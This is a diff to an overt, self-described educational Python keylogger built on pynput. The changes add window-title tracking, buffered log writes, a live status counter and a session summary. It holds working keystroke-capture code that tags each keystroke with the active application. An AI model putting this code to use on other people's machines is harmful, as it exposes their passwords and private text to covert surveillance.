@@ -21,18 +21,21 @@ Design notes
   multi-key "stop" combo (Ctrl + Alt + K by default).
 - Formats special keys (Enter, Tab, Backspace, arrows, ...) as
   readable tokens so the resulting log is human-skimmable.
-- Writes to disk on every keystroke. This is simple and durable but
-  not performant — an educational trade-off. A production tool would
-  buffer writes.
+- Optionally records foreground window title changes for context.
+- Buffers writes and flushes on newline / stop for smoother typing.
 """
 
 from __future__ import annotations
 
+import sys
+import threading
 from datetime import datetime
 from pathlib import Path
-from typing import Iterable, Optional
+from typing import Iterable, Optional, TextIO
 
 from pynput import keyboard
+
+from window_info import get_foreground_title
 
 
 # ---------------------------------------------------------------------------
@@ -83,6 +86,23 @@ SPECIAL_KEY_MAP = {
 }
 
 
+def _supports_ansi() -> bool:
+    if sys.platform == "win32":
+        try:
+            import ctypes
+
+            kernel32 = ctypes.windll.kernel32
+            handle = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
+            mode = ctypes.c_uint32()
+            if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
+                return False
+            # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
+            return kernel32.SetConsoleMode(handle, mode.value | 0x0004) != 0
+        except Exception:  # noqa: BLE001
+            return False
+    return sys.stdout.isatty()
+
+
 # ---------------------------------------------------------------------------
 # KeyLogger
 # ---------------------------------------------------------------------------
@@ -100,6 +120,12 @@ class KeyLogger:
     stop_char:
         Character that, together with Ctrl and Alt, ends the session.
         Default is ``'k'`` → press Ctrl+Alt+K to stop.
+    live:
+        When True, echo each logged token to the console (educational).
+    track_windows:
+        When True, write a marker whenever the focused window changes.
+    status:
+        When True, show a live keystroke counter on stderr.
     """
 
     def __init__(
@@ -107,6 +133,9 @@ class KeyLogger:
         log_dir: Path | str = "logs",
         filename: Optional[str] = None,
         stop_char: str = "k",
+        live: bool = False,
+        track_windows: bool = True,
+        status: bool = True,
     ) -> None:
         self.log_dir = Path(log_dir)
         self.log_dir.mkdir(parents=True, exist_ok=True)
@@ -117,10 +146,19 @@ class KeyLogger:
 
         self.log_file = self.log_dir / filename
         self.stop_char = stop_char.lower()
+        self.live = live
+        self.track_windows = track_windows
+        self.status = status
 
         self._pressed: set = set()
         self._key_count: int = 0
         self._started_at: Optional[datetime] = None
+        self._buffer: list[str] = []
+        self._lock = threading.Lock()
+        self._last_window: Optional[str] = None
+        self._fh: Optional[TextIO] = None
+        self._ansi = _supports_ansi()
+        self._stop_event = threading.Event()
 
     # ------------------------------------------------------------------
     # Internal helpers
@@ -154,10 +192,93 @@ class KeyLogger:
         name = getattr(key, "name", None) or str(key).replace("Key.", "")
         return f"[{name.upper()}]"
 
-    def _append(self, text: str) -> None:
-        """Append `text` to the log file. Opens-per-write for durability."""
-        with open(self.log_file, "a", encoding="utf-8") as fh:
-            fh.write(text)
+    def _flush(self) -> None:
+        if not self._buffer or self._fh is None:
+            return
+        self._fh.write("".join(self._buffer))
+        self._fh.flush()
+        self._buffer.clear()
+
+    def _append(self, text: str, *, force_flush: bool = False) -> None:
+        """Buffer `text`; flush on newline, large buffer, or force."""
+        with self._lock:
+            self._buffer.append(text)
+            if force_flush or "\n" in text or len(self._buffer) >= 64:
+                self._flush()
+
+    def _maybe_log_window(self) -> None:
+        if not self.track_windows:
+            return
+        title = get_foreground_title()
+        if not title or title == self._last_window:
+            return
+        self._last_window = title
+        # Flush any pending keystrokes before the context marker.
+        marker = f"\n[WINDOW] {title}\n"
+        self._append(marker, force_flush=True)
+        if self.live:
+            self._echo(marker.rstrip("\n"))
+
+    def _echo(self, token: str) -> None:
+        """Print a live token without fighting the status line."""
+        display = token.replace("\n", "[ENTER]\n").replace("\t", "[TAB]")
+        if self.status and self._ansi:
+            # Clear status line, print token, then redraw status.
+            sys.stderr.write("\r\033[K")
+            sys.stderr.flush()
+            print(display, end="", flush=True)
+            self._draw_status()
+        else:
+            print(display, end="", flush=True)
+
+    def _draw_status(self) -> None:
+        if not self.status:
+            return
+        elapsed = 0.0
+        if self._started_at is not None:
+            elapsed = (datetime.now() - self._started_at).total_seconds()
+        mins, secs = divmod(int(elapsed), 60)
+        line = (
+            f"  keys: {self._key_count:<6}  "
+            f"time: {mins:02d}:{secs:02d}  "
+            f"stop: Ctrl+Alt+{self.stop_char.upper()}  "
+        )
+        if self._last_window:
+            short = self._last_window if len(self._last_window) <= 40 else (
+                self._last_window[:37] + "..."
+            )
+            line += f"app: {short}"
+        if self._ansi:
+            sys.stderr.write(f"\r\033[K{line}")
+        else:
+            sys.stderr.write(f"\r{line}")
+        sys.stderr.flush()
+
+    def _status_loop(self) -> None:
+        while not self._stop_event.wait(0.5):
+            self._draw_status()
+
+    def _print_summary(self) -> None:
+        ended = datetime.now()
+        duration = 0.0
+        if self._started_at is not None:
+            duration = (ended - self._started_at).total_seconds()
+        rate = self._key_count / duration if duration > 0 else 0.0
+
+        if self.status and self._ansi:
+            sys.stderr.write("\r\033[K")
+            sys.stderr.flush()
+
+        print()
+        print("-" * 52)
+        print("  Session complete")
+        print(f"  Log file     : {self.log_file.resolve()}")
+        print(f"  Keystrokes   : {self._key_count}")
+        print(f"  Duration     : {duration:.1f}s")
+        print(f"  Avg rate     : {rate:.1f} keys/s")
+        print("-" * 52)
+        print(f'  Tip: python main.py view "{self.log_file.name}"')
+        print()
 
     # ------------------------------------------------------------------
     # pynput callbacks
@@ -167,19 +288,24 @@ class KeyLogger:
         self._pressed.add(key)
 
         if self._is_stop_combo():
+            self._stop_event.set()
             footer = (
                 f"\n\n=== Session ended {datetime.now():%Y-%m-%d %H:%M:%S} "
                 f"({self._key_count} keystrokes captured) ===\n"
             )
-            self._append(footer)
-            print(f"\n[!] Stop combo detected. Log saved to: {self.log_file}")
-            print(f"[!] Captured {self._key_count} keystrokes.")
+            self._append(footer, force_flush=True)
             return False  # returning False from on_press stops the listener
+
+        self._maybe_log_window()
 
         token = self._format_key(key)
         if token:
             self._append(token)
             self._key_count += 1
+            if self.live:
+                self._echo(token)
+            elif self.status:
+                self._draw_status()
 
     def _on_release(self, key):
         # Keep the pressed-set accurate so combos aren't "sticky".
@@ -189,19 +315,53 @@ class KeyLogger:
     # Public API
     # ------------------------------------------------------------------
 
-    def start(self) -> None:
-        """Block the current thread and log keystrokes until the stop combo."""
+    def start(self) -> Path:
+        """Block until the stop combo; return the log file path."""
         self._started_at = datetime.now()
+        self._fh = open(self.log_file, "a", encoding="utf-8")
         header = (
             f"=== Session started {self._started_at:%Y-%m-%d %H:%M:%S} ===\n"
         )
-        self._append(header)
+        self._append(header, force_flush=True)
 
-        print(f"[*] Keylogger running. Log file: {self.log_file}")
-        print(f"[*] Press Ctrl+Alt+{self.stop_char.upper()} to stop.\n")
+        # Seed window context immediately so the first keys have a home.
+        if self.track_windows:
+            title = get_foreground_title()
+            if title:
+                self._last_window = title
+                self._append(f"[WINDOW] {title}\n", force_flush=True)
 
-        with keyboard.Listener(
-            on_press=self._on_press,
-            on_release=self._on_release,
-        ) as listener:
-            listener.join()
+        print(f"[*] Logging to : {self.log_file.resolve()}")
+        print(f"[*] Stop with  : Ctrl+Alt+{self.stop_char.upper()}")
+        if self.track_windows:
+            print("[*] Window titles will be recorded when focus changes.")
+        if self.live:
+            print("[*] Live echo  : ON (keys appear below as you type)")
+        print()
+
+        status_thread: Optional[threading.Thread] = None
+        if self.status:
+            status_thread = threading.Thread(
+                target=self._status_loop, daemon=True
+            )
+            status_thread.start()
+            self._draw_status()
+
+        try:
+            with keyboard.Listener(
+                on_press=self._on_press,
+                on_release=self._on_release,
+            ) as listener:
+                listener.join()
+        finally:
+            self._stop_event.set()
+            with self._lock:
+                self._flush()
+                if self._fh is not None:
+                    self._fh.close()
+                    self._fh = None
+            if status_thread is not None:
+                status_thread.join(timeout=1.0)
+            self._print_summary()
+
+        return self.log_file
